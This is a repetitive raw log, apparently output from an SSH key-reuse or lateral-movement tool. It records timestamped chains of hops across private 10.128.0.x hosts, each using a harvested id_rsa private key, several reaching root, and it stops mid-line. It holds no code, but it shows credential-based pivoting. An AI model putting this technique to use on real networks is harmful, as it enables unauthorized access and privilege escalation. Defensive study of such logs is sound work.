jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020338]         jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020338]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020338]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020338]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020338]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020338]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020338]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020339]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020339]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020339]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020339]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020340]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020340]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020340]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020340]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020340]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020340]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020341]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020341]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020341]        jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020341]        jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020342]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020342]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020342]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020342]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020342]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020342]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020343]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020343]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020343]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020343]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020343]       jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020343]       jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020343]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020343]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020344]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020344]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020344]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020344]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020345]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020345]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020345]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020345]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020345]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020345]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020346]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020346]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020346]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020346]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020346]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020346]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020347]      jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020347]      jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020347]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020347]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020348]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020348]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020348]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020348]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020348]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020348]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020348]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@127.0.0.1\n[1704020348]    